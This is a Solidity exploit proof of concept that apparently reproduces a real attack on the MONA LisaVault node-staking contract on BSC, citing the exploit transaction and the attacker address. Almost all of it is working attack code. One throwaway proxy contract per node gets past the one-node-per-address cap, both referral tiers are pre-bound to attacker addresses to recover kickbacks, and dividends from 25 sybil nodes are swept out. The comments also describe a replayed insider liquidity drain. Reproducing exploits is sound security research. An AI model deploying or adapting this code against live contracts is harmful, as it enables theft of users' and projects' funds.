// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// @title   MONA LisaVault — Exploit PoC (BSC, block 92,429,268)
//
// @description
//   The MONA node-staking vault (LisaVault) on BSC was exploited in two stages:
//
//   STAGE 1 — LP Drain (insider component, replayed via the config's
//     `callScript` impersonating VAULT_OWNER — no Foundry cheatcodes needed in
//     this replay environment, since the recorder can already call as any
//     address). The vault deployer (0xDd02...) also controlled the entire
//     MONA/USDT PancakeSwap LP. Redeeming it releases MONA (which stays with
//     the owner — MONA is a transfer-restricted token) and USDT, which is
//     forwarded to this attack contract.
//
//   STAGE 2 — Vault self-referral exploit (this contract, recorded)
//     For each 220 USDT node purchase the vault distributes:
//       80 USDT → vault reserve
//       20 USDT → WBNB conversion (PancakeSwap USDT/WBNB LP)
//       70 USDT → Level-1 referrer
//       50 USDT → Level-2 referrer
//     By buying 25 nodes via one throw-away `NodeBuyer` proxy contract per node
//     (bypassing the vault's per-`msg.sender` "one node" cap) and pre-binding
//     both referrer tiers to itself, this contract recovers a large share of
//     every node's cost and harvests a flat 400-MONA dividend per node from an
//     un-gated shared pool.
//
// @exploitTx   0x3a60e1b3a4b0736be4f31839bfd7abc8bfc53b93ddbd3702e77fbc64561a7ea4
// @block       92,429,268
// @attacker    0x7eeEC499e501293f6e589d550046375a2ad0b4c3
// @refs
//   https://bscscan.com/tx/0x3a60e1b3a4b0736be4f31839bfd7abc8bfc53b93ddbd3702e77fbc64561a7ea4

// ── Minimal external interface ─────────────────────────────────────────────────

interface IERC20Min {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

// ── NodeBuyer helper — one instance per node slot ─────────────────────────────
//   Each is a separate contract address, bypassing the vault's
//   "Node: already owned" per-address (per-msg.sender) restriction.

contract NodeBuyer {
    address immutable ATTACK;
    address constant USDT   = 0x55d398326f99059fF775485246999027B3197955;
    address constant VAULT  = 0xaEa6E5CA6c1FeeAbBd3A114BCbca30A21424F76b;
    address constant HELPER = 0xb9D8F078043DBf3297416735A84aB87324190FeC;

    constructor(address _attack) { ATTACK = _attack; }

    /// Register `l1` as Level-1 referrer then purchase one node (costs 220 USDT).
    function setup(address l1) external {
        require(msg.sender == ATTACK);
        // bindReferrer(address) — selector confirmed via `cast sig`
        (bool ok,) = HELPER.call(abi.encodeWithSelector(0x04f618cb, l1));
        require(ok, "bindReferrer failed");
        IERC20Min(USDT).approve(VAULT, 220 * 1e18);
        // buyNode() — selector confirmed against the live trace
        (bool ok2,) = VAULT.call(abi.encodeWithSelector(0xb9c4788c));
        require(ok2, "buyNode failed");
    }

    /// Claim accumulated MONA dividend for this node.
    function claim() external {
        require(msg.sender == ATTACK);
        // claim() selector confirmed from the Phalcon trace of the live tx
        (bool ok,) = VAULT.call(abi.encodeWithSelector(0x3af10fe2));
        require(ok, "claim failed");
    }

    /// Sweep any token balance back to the attack contract.
    function sweep(address token) external {
        require(msg.sender == ATTACK);
        uint bal = IERC20Min(token).balanceOf(address(this));
        if (bal > 0) IERC20Min(token).transfer(ATTACK, bal);
    }
}

// ── Main exploit contract ─────────────────────────────────────────────────────
//   Deployed as the attacker. STAGE 1 (LP drain, impersonating the insider
//   VAULT_OWNER) runs as recorded `callScript` steps in the PoC config and
//   lands the USDT proceeds on this contract's own balance BEFORE `attack()`
//   runs.

contract MONA_LisaVault {
    address constant USDT   = 0x55d398326f99059fF775485246999027B3197955;
    address constant MONA   = 0x311838c073a865E8249F5C35E4cb2a5f815a36e8;
    address constant HELPER = 0xb9D8F078043DBf3297416735A84aB87324190FeC;

    // Level-2 referrer — also attacker-controlled; receives 50 USDT per node.
    // A fresh, previously-unbound address is used (as in the reproduced
    // Foundry PoC) so binding it never collides with pre-existing on-chain
    // referral state; the real live attack used a different funded L2 wallet,
    // but the payout mechanics are identical either way.
    address constant L2_REFERRER = address(0xBEEF);

    uint constant NUM_NODES = 25; // exact number used in the real exploit tx

    NodeBuyer[] public buyers;

    /// Full attack: pre-bind our own upline, buy 25 sybil nodes recovering the
    /// referral kickbacks, then harvest the MONA dividend from every node.
    function attack() external {
        // Pre-bind this contract's own Level-2 upline so that once each sybil
        // binds *this contract* as its Level-1 referrer, the vault's referral
        // walk pays BOTH tiers into attacker-controlled addresses.
        (bool okL2,) = HELPER.call(abi.encodeWithSelector(0x04f618cb, L2_REFERRER));
        require(okL2, "L2 bindReferrer failed");

        // STAGE 2: deploy NUM_NODES proxy contracts; each buys exactly one
        // node, registering *this* contract as its L1 referrer.
        for (uint i = 0; i < NUM_NODES; i++) {
            NodeBuyer b = new NodeBuyer(address(this));
            buyers.push(b);
            IERC20Min(USDT).transfer(address(b), 220 * 1e18);
            b.setup(address(this));
        }

        // STAGE 3: claim the MONA dividend for every sybil node and sweep it
        // back to this contract.
        for (uint i = 0; i < buyers.length; i++) {
            try buyers[i].claim() {} catch {}
            buyers[i].sweep(MONA);
        }
    }
}
